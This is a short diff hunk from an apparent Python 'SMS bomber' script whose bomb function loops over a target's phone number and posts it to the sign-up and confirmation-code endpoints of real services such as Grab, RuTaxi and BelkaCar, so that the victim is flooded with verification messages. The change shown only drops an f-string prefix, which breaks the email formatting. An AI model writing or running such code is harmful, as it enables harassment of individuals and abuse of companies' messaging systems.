@@ -52,7 +52,7 @@ def bomb(message):
         def thsp(_phone, _name, _phone9, _phoneAresBank, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, iteration):
             while iteration < 10:
                 try:
-                    _email = _name+f'{iteration}'+'@gmail.com'
+                    _email = _name+'{iteration}'+'@gmail.com'
                     grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                     rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
                     belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
